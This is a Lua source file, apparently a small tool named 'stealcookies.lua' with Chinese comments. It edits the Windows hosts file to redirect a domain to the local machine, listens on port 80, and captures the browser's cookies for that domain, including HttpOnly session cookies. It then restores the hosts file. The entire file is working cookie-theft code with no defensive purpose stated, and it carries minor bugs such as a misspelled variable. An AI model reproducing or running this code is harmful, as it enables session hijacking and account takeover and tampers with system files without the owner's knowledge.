local socket = require "socket"
local string = require "string"
local table = require "table"
local os = require "io"
local config = require "config"

-----------------------------------------
-- stealcookies.lua 2014-5-22 chk
-- 获取所有cookie(httponly)
-- 1. 设置hosts文件， 域名指向本机
-- 2. 在本机监听 80 端口
-- 3. 接收http头
-- 4. 恢复 hosts 文件
-----------------------------------------

local stealcookiesconfig = config.stealcookiesconfig

local _M = {}
_M.hosts_filename = config.stealcookiesconfig.hosts_filename or "C:\\WINDOWS\\system32\\drivers\\etc\\hosts"
_M.host = config.stealcookiesconfig.host or "127.0.0.2"
_M.port = config.stealcookiesconfig.port or 80
local timeout = config.stealcookiesconfig.timeout or 5

-- op = "add" | "del"
-- map = {ip="x.x.x.x", domain=...}
function _M.hosts(op,map)
	local hostsfn = _M.hosts_filename
	local f = io.open(hostsfn, "r+") 
	if op == "add" then 
		if not (map.ip and map.domain) then 
			return 
		end
		f:seek("end")
		f:write("\n" .. map.ip.."\t"..map.domain)
		f:flush()
		f:close()
	elseif op == "del" then
		local fbuf = {}
		for line in f:lines() do
			if not string.find(line, map.domain, 1, true) and line ~= "" then
				table.insert(fbuf, line)
			end
		end
		f:close()
		f = io.open(hostsfn, "w+")
		for _, line in ipairs(fbuf) do
			f:write(line.."\n")
		end
		f:flush()
		f:close()
	end
end

function _M.listen()
	_M.s = assert(socket.bind(_M.host, _M.port, 1))
	_M.s:settimeout(timeout)
end

function _M.cookie()
	local client = _M.s:accept()
	if not client then 
		_M.s:close()
		return nil
	end
	local headers, err = _M.receiveheaders(client)
	client:close()
	_M.s:close()
	if not hearders and err then print(err); return nil end
	return headers["cookie"]
end

function _M.receiveheaders(sock, headers)
	local line, name, value, err
	headers = headers or {}
	-- get first line
	line, err = sock:receive()
	if err then return nil, err end
	-- headers go until a blank line is found
	-- skip method
	if not string.match(line, "^GET") then return nil, "NOT a GET method" end
	line, err = sock:receive()
	if err then return nil, err end
	while line ~= "" do
		-- get field-name and value
		name, value = socket.skip(2, string.find(line, "^(.-):%s*(.*)"))
		if not (name and value) then return nil, "malformed reponse headers" end
		name = string.lower(name)
		if headers[name] then headers[name] = headers[name] .. ", " .. value
		else headers[name] = value end
		-- get next line (value might be folded)
		line, err  = sock:receive()
		if err then break end
		-- unfold any folded values
		while string.find(line, "^%s") do
			value = value .. line
			line = sock:receive()
			if err then break end
		end
		-- save pair in table before socket error
		-- if headers[name] then headers[name] = headers[name] .. ", " .. value
		-- else headers[name] = value end
	end
	return headers
end

return _M

	
